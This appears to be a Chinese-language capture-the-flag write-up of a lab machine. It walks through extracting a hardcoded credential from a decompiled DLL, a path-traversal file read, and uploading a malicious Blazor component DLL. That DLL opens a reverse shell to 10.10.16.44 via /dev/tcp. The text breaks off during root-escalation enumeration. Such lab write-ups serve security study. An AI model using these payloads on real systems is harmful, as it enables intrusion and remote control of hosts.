+<p><img alt="image-20241112102902586.png" loading="lazy" decoding="async" width="1223" height="733" src="/_astro/image-20241112102902586.rwkTymuQ_Z1WCea.webp" srcset=""></p>
+<p>发现了一些 DLL 及其 sha256，这里可以看一下有没有自定义的 dll 文件</p>
+<p><img alt="image-20241112103432369.png" loading="lazy" decoding="async" width="607" height="558" src="/_astro/image-20241112103432369.CtoxzFu4_28bevm.webp" srcset=""></p>
+<p><img alt="image-20241112103649554.png" loading="lazy" decoding="async" width="999" height="104" src="/_astro/image-20241112103649554.7nZMKLy6_5dxvv.webp" srcset=""></p>
+<p>下载到本地，查看字符串，由于 Windows 变成会用宽字符，所以也要尝试 <code>strings -e b</code> 查看</p>
+<p><img alt="image-20241112103805766.png" loading="lazy" decoding="async" width="1383" height="480" src="/_astro/image-20241112103805766.B6i9bX1t_ScRio.webp" srcset=""></p>
+<p>有些 base64 字符串，也有噪音，可以使用 CodemerxDecompile 看一下</p>
+<p><img alt="image-20241112164228242.png" loading="lazy" decoding="async" width="2167" height="1149" src="/_astro/image-20241112164228242.B8WDNCBj_1YeFgl.webp" srcset=""></p>
+<p><img alt="image-20241112114621122.png" loading="lazy" decoding="async" width="1337" height="308" src="/_astro/image-20241112114621122.CBEwl0Pr_ZOdOmO.webp" srcset=""></p>
+<p>其中包含一个凭据 <code>admin:AJbFA_Q@925p9ap#22</code>，尝试 ssh 登录失败，转向 3000 端口</p>
+<p><img alt="image-20241112122728945.png" loading="lazy" decoding="async" width="1252" height="830" src="/_astro/image-20241112122728945.OjKv3xon_ZVYtEc.webp" srcset=""></p>
+<p><img alt="image-20241112125546716.png" loading="lazy" decoding="async" width="1578" height="935" src="/_astro/image-20241112125546716.ByorMrDE_ZAV9yp.webp" srcset=""></p>
+<p>这里可以看到 8000 端口的 Web 服务，其中有个很明显的拼接漏洞，如果传入的参数为：</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>lang = ../../../</span></span>
+<span class="line"><span>file_ext = './etc/passwd'</span></span></code></pre>
+<p>那么最终拼接得到的字符串为</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>/var/www/sites/localisation/../../.././etc/passwd</span></span>
+<span class="line"><span>=&gt; /etc/passwd</span></span></code></pre>
+<p><img alt="image-20241112130043331.png" loading="lazy" decoding="async" width="1212" height="917" src="/_astro/image-20241112130043331.DWVnZ_jG_VrhOa.webp" srcset=""></p>
+<p>其中分配到 Bash 的用户有 <code>root</code>、<code>tomas</code> 尝试读取他们目录下的私钥</p>
+<p><img alt="image-20241112130912002.png" loading="lazy" decoding="async" width="1231" height="620" src="/_astro/image-20241112130912002.5YSfAuvD_1DtoE8.webp" srcset=""></p>
+<p>尝试了几次无法读取，猜测可能是权限不够</p>
+<p><img alt="image-20241112150022331.png" loading="lazy" decoding="async" width="1164" height="304" src="/_astro/image-20241112150022331.RWufGOXv_Z2sgQ3Q.webp" srcset=""></p>
+<p>再看这里的 Logs 功能，发现他是加载 <code>/opt/composnents/Logs.dll</code> 实现的，那么刚好这里也有一个上传接口，如果能上传一个 vuln.dll 到这里然后利用此功能点加载 dll 应该可以获得进一步的权限。</p>
+<p><img alt="image-20241112150155147.png" loading="lazy" decoding="async" width="1226" height="426" src="/_astro/image-20241112150155147.DEEl7vHE_1Qo2MU.webp" srcset=""></p>
+<p>这里的上传流量是 blazor 框架以 Web Assembly 方式运行，通过 Web socket 通讯，因此 BurpSuite 需要一个 Blazor Traffic Processor 插件会比较方便。</p>
+<p>那么接下来创建一个 C# 项目</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>dotnet new classlib -n rev</span></span></code></pre>
+<p>编辑 <code>rev/Class1.cs</code></p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="csharp"><code><span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">using</span><span style="--shiki-light:#6F42C1;--shiki-dark:#ACAFFF"> System</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">;</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">using</span><span style="--shiki-light:#6F42C1;--shiki-dark:#ACAFFF"> System</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#ACAFFF">Diagnostics</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">namespace</span><span style="--shiki-light:#6F42C1;--shiki-dark:#ACAFFF"> BackConnect</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9"> {</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">  class</span><span style="--shiki-light:#6F42C1;--shiki-dark:#ACAFFF"> ReverseBash</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9"> {</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">        public</span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF"> static</span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF"> void</span><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF"> Main</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">(</span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">string</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">[] </span><span style="--shiki-light:#6F42C1;--shiki-dark:#EEF0F9">args</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">) {</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#ACAFFF">          Process</span><span style="--shiki-light:#6F42C1;--shiki-dark:#4BF3C8"> proc</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9"> =</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9"> new</span><span style="--shiki-light:#6F42C1;--shiki-dark:#ACAFFF"> System</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#ACAFFF">Diagnostics</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#ACAFFF">Process</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">();</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">          proc</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">.</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">StartInfo</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">.</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">FileName</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9"> =</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> "sh"</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">;</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">          proc</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">.</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">StartInfo</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">.</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">Arguments</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9"> =</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> "-c </span><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9">\"</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">sh -i &gt;&amp; /dev/tcp/[ip]/[port] 0&gt;&amp;1</span><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9">\"</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">"</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">;</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">          proc</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">.</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">StartInfo</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">.</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">UseShellExecute</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9"> =</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> false</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">;</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">          proc</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">.</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">StartInfo</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">.</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">RedirectStandardOutput</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9"> =</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> true</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">;</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">          proc</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF">Start</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">();</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">          while</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9"> (</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">!</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">proc</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">.</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">StandardOutput</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">.</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">EndOfStream</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">) {</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">                Console</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF">WriteLine</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">(</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">proc</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">.</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">StandardOutput</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF">ReadLine</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">());</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">          }</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">        }</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">  }</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">}</span></span></code></pre>
+<p>编译项目，以 release 模式生成</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>dotnet build -c release</span></span></code></pre>
+<p><img alt="image-20241112154014500.png" loading="lazy" decoding="async" width="514" height="835" src="/_astro/image-20241112154014500.J7bYepxs_17zb7n.webp" srcset=""></p>
+<p>然后 BurpSuite 开启拦截，上传 dll 文件</p>
+<p><img alt="image-20241112155255289.png" loading="lazy" decoding="async" width="1008" height="1037" src="/_astro/image-20241112155255289.BBCeWFTH_ZSIcJu.webp" srcset=""></p>
+<p>将第一个包的数据中的 name 字段更改为下图</p>
+<p><img alt="image-20241112155618249.png" loading="lazy" decoding="async" width="1270" height="460" src="/_astro/image-20241112155618249.B7FZpTpL_Zc9sQF.webp" srcset=""></p>
+<p>后续的数据包都可以放行了</p>
+<p><img alt="image-20241112155229302.png" loading="lazy" decoding="async" width="1495" height="545" src="/_astro/image-20241112155229302.D5i4Qvt7_Z2YGhm.webp" srcset=""></p>
+<p>提示上传成功，尝试加载</p>
+<p><img alt="image-20241112155706548.png" loading="lazy" decoding="async" width="1364" height="223" src="/_astro/image-20241112155706548.Bf_EVsqb_Z1ECyxT.webp" srcset=""></p>
+<p>这里提示缺失 component 类，前面编译时忽略了一点，就是关于 DLL 的加载问题，不像 PE 文件从 Main 函数作为入口，DLL 会有加载函数，那么明白这一点，可以通过模仿 Logs.dll 文件的格式来创建。</p>
+<p>通过任意文件读取漏洞下载 Logs.dll</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>curl "http://lantern.htb//PrivacyAndPolicy?lang=../../../../../&amp;ext=./opt/components/Logs.dll" -o Logs.dll</span></span></code></pre>
+<p><img alt="image-20241112164532252.png" loading="lazy" decoding="async" width="1439" height="1005" src="/_astro/image-20241112164532252.DDUKE7Wg_279HKp.webp" srcset=""></p>
+<p>反编译可以看到对应的架构，直接拿过来修改</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="csharp"><code><span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">using</span><span style="--shiki-light:#6F42C1;--shiki-dark:#ACAFFF"> Microsoft</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#ACAFFF">AspNetCore</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#ACAFFF">Components</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">;</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">using</span><span style="--shiki-light:#6F42C1;--shiki-dark:#ACAFFF"> Microsoft</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#ACAFFF">AspNetCore</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#ACAFFF">Components</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#ACAFFF">Rendering</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">;</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">using</span><span style="--shiki-light:#6F42C1;--shiki-dark:#ACAFFF"> System</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">;</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">using</span><span style="--shiki-light:#6F42C1;--shiki-dark:#ACAFFF"> System</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#ACAFFF">Diagnostics</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">;</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">using</span><span style="--shiki-light:#6F42C1;--shiki-dark:#ACAFFF"> System</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#ACAFFF">IO</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">namespace</span><span style="--shiki-light:#6F42C1;--shiki-dark:#ACAFFF"> rev</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">{</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">	public</span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF"> class</span><span style="--shiki-light:#6F42C1;--shiki-dark:#ACAFFF"> Component</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9"> : </span><span style="--shiki-light:#6F42C1;--shiki-dark:#ACAFFF">ComponentBase</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">	{</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">		protected</span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF"> override</span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF"> void</span><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF"> BuildRenderTree</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">(</span><span style="--shiki-light:#6F42C1;--shiki-dark:#ACAFFF">RenderTreeBuilder</span><span style="--shiki-light:#6F42C1;--shiki-dark:#EEF0F9"> __builder</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">)</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">		{</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#ACAFFF">			Process</span><span style="--shiki-light:#6F42C1;--shiki-dark:#4BF3C8"> proc</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9"> =</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9"> new</span><span style="--shiki-light:#6F42C1;--shiki-dark:#ACAFFF"> System</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#ACAFFF">Diagnostics</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#ACAFFF">Process</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">();</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">			proc</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">.</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">StartInfo</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">.</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">FileName</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9"> =</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> "sh"</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">;</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">			proc</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">.</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">StartInfo</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">.</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">Arguments</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9"> =</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> "-c </span><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9">\"</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">sh -i &gt;&amp; /dev/tcp/10.10.16.44/2233 0&gt;&amp;1</span><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9">\"</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">"</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">;</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">			proc</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">.</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">StartInfo</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">.</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">UseShellExecute</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9"> =</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> false</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">;</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">			proc</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">.</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">StartInfo</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">.</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">RedirectStandardOutput</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9"> =</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> true</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">;</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">			proc</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF">Start</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">();</span></span>
+<span class="line"></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">			while</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9"> (</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">!</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">proc</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">.</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">StandardOutput</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">.</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">EndOfStream</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">) {</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">			Console</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF">WriteLine</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">(</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">proc</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">.</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">StandardOutput</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF">ReadLine</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">());</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">			}</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">		}</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">	}</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">}</span></span></code></pre>
+<p><img alt="image-20241112164843828.png" loading="lazy" decoding="async" width="1624" height="342" src="/_astro/image-20241112164843828.DATZpbhU_tNhCx.webp" srcset=""></p>
+<p>但是编译有报错，需要添加两个包</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>dotnet add package Microsoft.AspNetCore.Components --version 6.0.0</span></span>
+<span class="line"><span>dotnet add package Microsoft.AspNetCore.Components.Web --version 6.0.0</span></span></code></pre>
+<p><img alt="image-20241112170949634.png" loading="lazy" decoding="async" width="978" height="494" src="/_astro/image-20241112170949634.CgVYMN2T_PbQnq.webp" srcset=""></p>
+<p>编译通过，继续前面的上传手法，提示文件重复就重新创建一个项目</p>
+<p><img alt="image-20241112170701751.png" loading="lazy" decoding="async" width="2208" height="554" src="/_astro/image-20241112170701751.C72Dpi5E_Zm7KUH.webp" srcset=""></p>
+<p>这次没有报错，但是 Shell 没有弹回来，更改反弹 Shell 命令，再次尝试</p>
+<p><img alt="image-20241112171607443.png" loading="lazy" decoding="async" width="713" height="880" src="/_astro/image-20241112171607443.B5hmt7p9_28veG6.webp" srcset=""></p>
+<p>可以成功读取私钥</p>
+<h3 id="local-enum">Local Enum</h3>
+<p><img alt="image-20241112171724434.png" loading="lazy" decoding="async" width="1054" height="128" src="/_astro/image-20241112171724434.CzO2EHhB_Z2h3khr.webp" srcset=""></p>
+<p>发现 sudo 权限，而且 procmon 可以监控进程行为，猜测有定时或自动任务运行。</p>
+<p><img alt="image-20241112172130488.png" loading="lazy" decoding="async" width="780" height="148" src="/_astro/image-20241112172130488.CWHmUNuC_ZEssxV.webp" srcset=""></p>
+<p>查看进程列表，发现可疑进程</p>
+<h2 id="shell-as-root">Shell as Root</h2>
+<p>运行 procmon</p>
+<p><img alt="image-20241112172302097.png" loading="lazy" decoding="async" width="1510" height="864" src="/_astro/image-20241112172302097.BVwh_AcQ_ZRrWom.webp" srcset=""></p>
+<p>发现一些写入行为，使用 <code>sudo procmon -p [pid]</code> 单独抓取，然后保存信息</p>
+<p><img alt="image-20241112173619389.png" loading="lazy" decoding="async" width="957" height="770" src="/_astro/image-20241112173619389.DSaNeNoA_1AkYQx.webp" srcset=""></p>
+<p>信息比较杂，使用 -e 参数指定 write 行为</p>
+<p><img alt="image-20241112175731726.png" loading="lazy" decoding="async" width="1888" height="373" src="/_astro/image-20241112175731726.CjWZbKjV_KldeK.webp" srcset=""></p>
+<p>可以看到 arguments 字段是进程写入相关的信息，可以全部导出来，由于是二进制数据，导出来是hex 格式</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="sql"><code><span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">select</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9"> hex(arguments) </span><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">from</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9"> ebpf;</span></span></code></pre>
+<p><img alt="image-20241112180210005.png" loading="lazy" decoding="async" width="833" height="575" src="/_astro/image-20241112180210005.uP5bhh43_1R0yNj.webp" srcset=""></p>
+<p>只抓到了这一点，看来还不够，可以使用 <code>watch -n 1 "ps aux | grep automation"</code> 来监控进程</p>
+<p>当它重新拉起的时候开始捕捉数据，对于导出的数据，去掉不可打印字符</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-light-font-style:inherit;--shiki-dark:#EEF0F98F;--shiki-dark-font-style:italic">#!/usr/bin/python3</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-light-font-style:inherit;--shiki-dark:#54B9FF;--shiki-dark-font-style:italic">with</span><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9"> open</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">(</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">'1'</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">, </span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">'r'</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">) </span><span style="--shiki-light:#D73A49;--shiki-light-font-style:inherit;--shiki-dark:#54B9FF;--shiki-dark-font-style:italic">as</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9"> f:</span></span>
+<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">    data </span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">=</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9"> f.</span><span style="--shiki-light:#24292E;--shiki-dark:#00DAEF">read</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">().</span><span style="--shiki-light:#24292E;--shiki-dark:#00DAEF">strip</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">().</span><span style="--shiki-light:#24292E;--shiki-dark:#00DAEF">split</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">(</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">'</span><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9">\n</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493">'</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">)</span></span>
+<span class="line"></span>
